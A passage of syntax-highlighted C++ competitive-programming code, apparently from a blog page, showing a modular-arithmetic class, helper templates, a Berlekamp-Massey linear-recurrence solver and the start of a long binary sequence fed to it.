</span></span><span style=display:flex><span>    Modular <span style=color:#66d9ef>operator</span><span style=color:#f92672>-</span>() <span style=color:#66d9ef>const</span> { <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span> <span style=color:#f92672>-</span> <span style=color:#f92672>*</span><span style=color:#66d9ef>this</span>; }
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>friend</span> <span style=color:#66d9ef>bool</span> <span style=color:#66d9ef>operator</span> <span style=color:#f92672>==</span> (<span style=color:#66d9ef>const</span> Modular <span style=color:#f92672>&amp;</span>lhs, <span style=color:#66d9ef>const</span> Modular <span style=color:#f92672>&amp;</span>rhs) { <span style=color:#66d9ef>return</span> lhs.v <span style=color:#f92672>==</span> rhs.v; }
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>friend</span> <span style=color:#66d9ef>bool</span> <span style=color:#66d9ef>operator</span> <span style=color:#f92672>!=</span> (<span style=color:#66d9ef>const</span> Modular <span style=color:#f92672>&amp;</span>lhs, <span style=color:#66d9ef>const</span> Modular <span style=color:#f92672>&amp;</span>rhs) { <span style=color:#66d9ef>return</span> lhs.v <span style=color:#f92672>!=</span> rhs.v; }
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>friend</span> std<span style=color:#f92672>::</span>istream <span style=color:#f92672>&amp;</span> <span style=color:#66d9ef>operator</span><span style=color:#f92672>&gt;&gt;</span>(std<span style=color:#f92672>::</span>istream <span style=color:#f92672>&amp;</span>I, Modular <span style=color:#f92672>&amp;</span>m) { T x; I <span style=color:#f92672>&gt;&gt;</span> x, m <span style=color:#f92672>=</span> x; <span style=color:#66d9ef>return</span> I; }
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>friend</span> std<span style=color:#f92672>::</span>ostream <span style=color:#f92672>&amp;</span> <span style=color:#66d9ef>operator</span><span style=color:#f92672>&lt;&lt;</span>(std<span style=color:#f92672>::</span>ostream <span style=color:#f92672>&amp;</span>O, <span style=color:#66d9ef>const</span> Modular <span style=color:#f92672>&amp;</span>m) { <span style=color:#66d9ef>return</span> O <span style=color:#f92672>&lt;&lt;</span> m.v; }
</span></span><span style=display:flex><span><span style=color:#66d9ef>private</span><span style=color:#f92672>:</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>constexpr</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>int</span> width <span style=color:#f92672>=</span> <span style=color:#66d9ef>sizeof</span>(T) <span style=color:#f92672>*</span> <span style=color:#ae81ff>8</span> <span style=color:#f92672>-</span> <span style=color:#ae81ff>1</span>;
</span></span><span style=display:flex><span>    T v;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>static</span> T <span style=color:#a6e22e>inverse</span>(T a) {
</span></span><span style=display:flex><span>        <span style=color:#75715e>// copy from tourist&#39;s template
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        T u <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>, v <span style=color:#f92672>=</span> <span style=color:#ae81ff>1</span>, m <span style=color:#f92672>=</span> MOD;
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>while</span> (a <span style=color:#f92672>!=</span> <span style=color:#ae81ff>0</span>) {
</span></span><span style=display:flex><span>            T t <span style=color:#f92672>=</span> m <span style=color:#f92672>/</span> a;
</span></span><span style=display:flex><span>            m <span style=color:#f92672>-=</span> t <span style=color:#f92672>*</span> a; std<span style=color:#f92672>::</span>swap(a, m);
</span></span><span style=display:flex><span>            u <span style=color:#f92672>-=</span> t <span style=color:#f92672>*</span> v; std<span style=color:#f92672>::</span>swap(u, v);
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>        assert(m <span style=color:#f92672>==</span> <span style=color:#ae81ff>1</span>);
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> u;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>};
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>using</span> <span style=color:#66d9ef>namespace</span> std;
</span></span><span style=display:flex><span><span style=color:#66d9ef>using</span> <span style=color:#66d9ef>namespace</span> __gnu_pbds;
</span></span><span style=display:flex><span><span style=color:#66d9ef>typedef</span> <span style=color:#66d9ef>int64_t</span> ll;
</span></span><span style=display:flex><span><span style=color:#66d9ef>typedef</span> <span style=color:#66d9ef>long</span> <span style=color:#66d9ef>double</span> ld;
</span></span><span style=display:flex><span><span style=color:#66d9ef>typedef</span> pair<span style=color:#f92672>&lt;</span>ll,ll<span style=color:#f92672>&gt;</span> pll;
</span></span><span style=display:flex><span><span style=color:#66d9ef>typedef</span> pair<span style=color:#f92672>&lt;</span>ld,ld<span style=color:#f92672>&gt;</span> pld;
</span></span><span style=display:flex><span><span style=color:#66d9ef>template</span> <span style=color:#f92672>&lt;</span><span style=color:#66d9ef>typename</span> T<span style=color:#f92672>&gt;</span> <span style=color:#66d9ef>using</span> max_heap <span style=color:#f92672>=</span> std<span style=color:#f92672>::</span>priority_queue<span style=color:#f92672>&lt;</span>T,vector<span style=color:#f92672>&lt;</span>T<span style=color:#f92672>&gt;</span>,less<span style=color:#f92672>&lt;</span>T<span style=color:#f92672>&gt;</span> <span style=color:#f92672>&gt;</span>;
</span></span><span style=display:flex><span><span style=color:#66d9ef>template</span> <span style=color:#f92672>&lt;</span><span style=color:#66d9ef>typename</span> T<span style=color:#f92672>&gt;</span> <span style=color:#66d9ef>using</span> min_heap <span style=color:#f92672>=</span> std<span style=color:#f92672>::</span>priority_queue<span style=color:#f92672>&lt;</span>T,vector<span style=color:#f92672>&lt;</span>T<span style=color:#f92672>&gt;</span>,greater<span style=color:#f92672>&lt;</span>T<span style=color:#f92672>&gt;</span> <span style=color:#f92672>&gt;</span>;
</span></span><span style=display:flex><span><span style=color:#66d9ef>template</span> <span style=color:#f92672>&lt;</span><span style=color:#66d9ef>typename</span> T<span style=color:#f92672>&gt;</span> <span style=color:#66d9ef>using</span> rbt <span style=color:#f92672>=</span> tree<span style=color:#f92672>&lt;</span>T,null_type,less<span style=color:#f92672>&lt;</span>T<span style=color:#f92672>&gt;</span>,rb_tree_tag,tree_order_statistics_node_update<span style=color:#f92672>&gt;</span>;
</span></span><span style=display:flex><span><span style=color:#66d9ef>template</span> <span style=color:#f92672>&lt;</span><span style=color:#66d9ef>typename</span> V, <span style=color:#66d9ef>typename</span> T<span style=color:#f92672>&gt;</span> <span style=color:#66d9ef>int</span> get_pos(<span style=color:#66d9ef>const</span> V <span style=color:#f92672>&amp;</span>v, T x) { <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>lower_bound</span>(all(v),x) <span style=color:#f92672>-</span> begin(v); }
</span></span><span style=display:flex><span><span style=color:#66d9ef>template</span> <span style=color:#f92672>&lt;</span><span style=color:#66d9ef>typename</span> V<span style=color:#f92672>&gt;</span> <span style=color:#66d9ef>void</span> sort_uni(V <span style=color:#f92672>&amp;</span>v) { sort(all(v)), v.erase(unique(all(v)),end(v)); }
</span></span><span style=display:flex><span><span style=color:#66d9ef>template</span> <span style=color:#f92672>&lt;</span><span style=color:#66d9ef>typename</span> T<span style=color:#f92672>&gt;</span> <span style=color:#66d9ef>bool</span> chmin(T <span style=color:#f92672>&amp;</span>x, <span style=color:#66d9ef>const</span> T <span style=color:#f92672>&amp;</span>v) { <span style=color:#66d9ef>return</span> v <span style=color:#f92672>&lt;</span> x <span style=color:#f92672>?</span> (x<span style=color:#f92672>=</span>v, true) <span style=color:#f92672>:</span> false; }
</span></span><span style=display:flex><span><span style=color:#66d9ef>template</span> <span style=color:#f92672>&lt;</span><span style=color:#66d9ef>typename</span> T<span style=color:#f92672>&gt;</span> <span style=color:#66d9ef>bool</span> chmax(T <span style=color:#f92672>&amp;</span>x, <span style=color:#66d9ef>const</span> T <span style=color:#f92672>&amp;</span>v) { <span style=color:#66d9ef>return</span> x <span style=color:#f92672>&lt;</span> v <span style=color:#f92672>?</span> (x<span style=color:#f92672>=</span>v, true) <span style=color:#f92672>:</span> false; }
</span></span><span style=display:flex><span><span style=color:#66d9ef>constexpr</span> <span style=color:#66d9ef>inline</span> ll <span style=color:#a6e22e>cdiv</span>(ll x, ll m) { <span style=color:#66d9ef>return</span> x<span style=color:#f92672>/</span>m <span style=color:#f92672>+</span> (x<span style=color:#f92672>%</span>m <span style=color:#f92672>?</span> (x<span style=color:#f92672>&lt;</span><span style=color:#ae81ff>0</span>) <span style=color:#f92672>^</span> (m<span style=color:#f92672>&gt;</span><span style=color:#ae81ff>0</span>) <span style=color:#f92672>:</span> <span style=color:#ae81ff>0</span>); } <span style=color:#75715e>// ceiling divide
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#66d9ef>constexpr</span> <span style=color:#66d9ef>inline</span> ll <span style=color:#a6e22e>modpow</span>(ll e,ll p,ll m) { ll r<span style=color:#f92672>=</span><span style=color:#ae81ff>1</span>; <span style=color:#66d9ef>for</span>(e<span style=color:#f92672>%=</span>m;p;p<span style=color:#f92672>&gt;&gt;=</span><span style=color:#ae81ff>1</span>,e<span style=color:#f92672>=</span>e<span style=color:#f92672>*</span>e<span style=color:#f92672>%</span>m) <span style=color:#66d9ef>if</span>(p<span style=color:#f92672>&amp;</span><span style=color:#ae81ff>1</span>) r<span style=color:#f92672>=</span>r<span style=color:#f92672>*</span>e<span style=color:#f92672>%</span>m; <span style=color:#66d9ef>return</span> r; }
</span></span><span style=display:flex><span><span style=color:#75715e>/*}}}*/</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>constexpr</span> ld PI <span style=color:#f92672>=</span> acos(<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>), eps <span style=color:#f92672>=</span> <span style=color:#ae81ff>1e-7</span>;
</span></span><span style=display:flex><span><span style=color:#66d9ef>constexpr</span> ll maxn <span style=color:#f92672>=</span> <span style=color:#ae81ff>500025</span>, INF <span style=color:#f92672>=</span> <span style=color:#ae81ff>1e18</span>, mod <span style=color:#f92672>=</span> <span style=color:#ae81ff>1000000007</span>, K <span style=color:#f92672>=</span> <span style=color:#ae81ff>14699</span>, inf <span style=color:#f92672>=</span> <span style=color:#ae81ff>1e9</span>;
</span></span><span style=display:flex><span><span style=color:#66d9ef>using</span> Mint <span style=color:#f92672>=</span> Modular<span style=color:#f92672>&lt;</span><span style=color:#66d9ef>int</span>, mod<span style=color:#f92672>&gt;</span>;
</span></span><span style=display:flex><span>Mint <span style=color:#a6e22e>modpow</span>(Mint e, <span style=color:#66d9ef>uint64_t</span> p) { Mint r <span style=color:#f92672>=</span> <span style=color:#ae81ff>1</span>; <span style=color:#66d9ef>while</span>(p) (p<span style=color:#f92672>&amp;</span><span style=color:#ae81ff>1</span>) <span style=color:#f92672>&amp;&amp;</span> (r <span style=color:#f92672>*=</span> e), e <span style=color:#f92672>*=</span> e, p <span style=color:#f92672>&gt;&gt;=</span> <span style=color:#ae81ff>1</span>; <span style=color:#66d9ef>return</span> r; } <span style=color:#75715e>// 0^0 = 1
</span></span></span><span style=display:flex><span><span style=color:#75715e>// clang-format on
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>namespace</span> linear_recurrence {
</span></span><span style=display:flex><span><span style=color:#66d9ef>template</span> <span style=color:#f92672>&lt;</span><span style=color:#66d9ef>typename</span> T<span style=color:#f92672>&gt;</span>
</span></span><span style=display:flex><span>vector<span style=color:#f92672>&lt;</span>T<span style=color:#f92672>&gt;</span> BerlekampMassey(vector<span style=color:#f92672>&lt;</span>T<span style=color:#f92672>&gt;</span> a) {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>auto</span> scalarProduct <span style=color:#f92672>=</span> [](vector<span style=color:#f92672>&lt;</span>T<span style=color:#f92672>&gt;</span> v, T c) {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>for</span> (T<span style=color:#f92672>&amp;</span> x : v) x <span style=color:#f92672>*=</span> c;
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> v;
</span></span><span style=display:flex><span>    };
</span></span><span style=display:flex><span>    vector<span style=color:#f92672>&lt;</span>T<span style=color:#f92672>&gt;</span> s, best;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>int</span> bestPos <span style=color:#f92672>=</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> (size_t i <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; i <span style=color:#f92672>&lt;</span> a.size(); i<span style=color:#f92672>++</span>) {
</span></span><span style=display:flex><span>        T error <span style=color:#f92672>=</span> a[i];
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>for</span> (size_t j <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; j <span style=color:#f92672>&lt;</span> s.size(); j<span style=color:#f92672>++</span>) error <span style=color:#f92672>-=</span> s[j] <span style=color:#f92672>*</span> a[i <span style=color:#f92672>-</span> <span style=color:#ae81ff>1</span> <span style=color:#f92672>-</span> j];
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (error <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>) <span style=color:#66d9ef>continue</span>;
</span></span><span style=display:flex><span>        vector<span style=color:#f92672>&lt;</span>T<span style=color:#f92672>&gt;</span> fix <span style=color:#f92672>=</span> scalarProduct(best, error);
</span></span><span style=display:flex><span>        fix.insert(fix.begin(), i <span style=color:#f92672>-</span> bestPos, <span style=color:#ae81ff>0</span>);
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (fix.size() <span style=color:#f92672>&gt;=</span> s.size()) {
</span></span><span style=display:flex><span>            best <span style=color:#f92672>=</span> scalarProduct(s, <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span> <span style=color:#f92672>/</span> error);
</span></span><span style=display:flex><span>            best.insert(best.begin(), <span style=color:#ae81ff>1</span> <span style=color:#f92672>/</span> error);
</span></span><span style=display:flex><span>            bestPos <span style=color:#f92672>=</span> i <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span>;
</span></span><span style=display:flex><span>            s.resize(fix.size());
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>for</span> (size_t j <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; j <span style=color:#f92672>&lt;</span> fix.size(); j<span style=color:#f92672>++</span>) s[j] <span style=color:#f92672>+=</span> fix[j];
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> s;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span><span style=color:#66d9ef>template</span> <span style=color:#f92672>&lt;</span><span style=color:#66d9ef>typename</span> T<span style=color:#f92672>&gt;</span>
</span></span><span style=display:flex><span>T deduce(vector<span style=color:#f92672>&lt;</span>T<span style=color:#f92672>&gt;</span> a, <span style=color:#66d9ef>int64_t</span> n) {
</span></span><span style=display:flex><span>    vector<span style=color:#f92672>&lt;</span>T<span style=color:#f92672>&gt;</span> s <span style=color:#f92672>=</span> BerlekampMassey(a);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (s.empty()) <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>    <span style=color:#75715e>// a[i] = \sum s[j] * a[i-j-1]
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    vector<span style=color:#f92672>&lt;</span>T<span style=color:#f92672>&gt;</span> r <span style=color:#f92672>=</span> {<span style=color:#ae81ff>1</span>};     <span style=color:#75715e>// 1
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    vector<span style=color:#f92672>&lt;</span>T<span style=color:#f92672>&gt;</span> e <span style=color:#f92672>=</span> {<span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>};  <span style=color:#75715e>// x;
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#66d9ef>auto</span> mul <span style=color:#f92672>=</span> [<span style=color:#f92672>&amp;</span>s](vector<span style=color:#f92672>&lt;</span>T<span style=color:#f92672>&gt;</span> a, vector<span style=color:#f92672>&lt;</span>T<span style=color:#f92672>&gt;</span> b) {
</span></span><span style=display:flex><span>        <span style=color:#75715e>// return a * b % (x^m - s)
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        vector<span style=color:#f92672>&lt;</span>T<span style=color:#f92672>&gt;</span> c(a.size() <span style=color:#f92672>+</span> b.size() <span style=color:#f92672>-</span> <span style=color:#ae81ff>1</span>);
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>for</span> (size_t i <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; i <span style=color:#f92672>&lt;</span> a.size(); i<span style=color:#f92672>++</span>)
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>for</span> (size_t j <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; j <span style=color:#f92672>&lt;</span> b.size(); j<span style=color:#f92672>++</span>) c[i <span style=color:#f92672>+</span> j] <span style=color:#f92672>+=</span> a[i] <span style=color:#f92672>*</span> b[j];
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>for</span> (size_t i <span style=color:#f92672>=</span> c.size() <span style=color:#f92672>-</span> <span style=color:#ae81ff>1</span>; i <span style=color:#f92672>&gt;=</span> s.size(); i<span style=color:#f92672>--</span>)
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>for</span> (size_t j <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; j <span style=color:#f92672>&lt;</span> s.size(); j<span style=color:#f92672>++</span>)
</span></span><span style=display:flex><span>                c[i <span style=color:#f92672>-</span> j <span style=color:#f92672>-</span> <span style=color:#ae81ff>1</span>] <span style=color:#f92672>+=</span> c[i] <span style=color:#f92672>*</span> s[j];
</span></span><span style=display:flex><span>        c.resize(s.size());
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> c;
</span></span><span style=display:flex><span>    };
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>while</span> (n) {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (n <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>1</span>) r <span style=color:#f92672>=</span> mul(r, e);
</span></span><span style=display:flex><span>        e <span style=color:#f92672>=</span> mul(e, e);
</span></span><span style=display:flex><span>        n <span style=color:#f92672>&gt;&gt;=</span> <span style=color:#ae81ff>1</span>;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    T sum <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> (size_t j <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; j <span style=color:#f92672>&lt;</span> r.size(); j<span style=color:#f92672>++</span>) sum <span style=color:#f92672>+=</span> r[j] <span style=color:#f92672>*</span> a[j];
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> sum;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>}  <span style=color:#75715e>// namespace linear_recurrence
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>signed</span> <span style=color:#a6e22e>main</span>() {
</span></span><span style=display:flex><span>    ios_base<span style=color:#f92672>::</span>sync_with_stdio(false);
</span></span><span style=display:flex><span>    cin.tie(<span style=color:#66d9ef>nullptr</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    vector<span style=color:#f92672>&lt;</span>Modular<span style=color:#f92672>&lt;</span><span style=color:#66d9ef>int</span>,<span style=color:#ae81ff>2</span><span style=color:#f92672>&gt;&gt;</span> arr <span style=color:#f92672>=</span>  { <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span 